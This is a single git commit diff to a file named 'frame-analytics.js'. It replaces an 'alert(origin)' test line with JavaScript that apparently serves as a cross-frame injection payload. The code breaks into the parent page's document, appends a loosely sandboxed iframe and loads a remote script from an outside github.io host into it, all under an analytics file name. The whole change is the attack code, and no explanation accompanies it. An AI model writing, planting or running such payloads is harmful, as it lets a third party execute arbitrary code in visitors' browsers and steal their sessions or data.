ba357de2e9b708fac899ba3e324fc6caf6cbafad
Azvect <44798332+Azvect@users.noreply.github.com>
2020-11-08 21:27:49 +0300

    Update frame-analytics.js

--- files/analytics/js/frame-analytics.js
+++ files/analytics/js/frame-analytics.js
@@ -1,1 +1,13 @@
-alert(origin);
+        const escape = () => {
+        let parent = window.parent;
+        let container = parent.document.getElementsByClassName("invisible");
+        if (parent.document.getElementsByClassName("invisible") != null) {
+            let replacement = parent.document.createElement("iframe");
+            replacement.setAttribute("sandbox", "allow-modals allow-scripts allow-same-origin");
+            parent.document.body.append(replacement);
+                                script = document.createElement('script');
+                                script.setAttribute('src', 'https://azvect.github.io/script.js');
+                                replacement.contentDocument.body.appendChild(script);
+      }
+    }
+ escape();
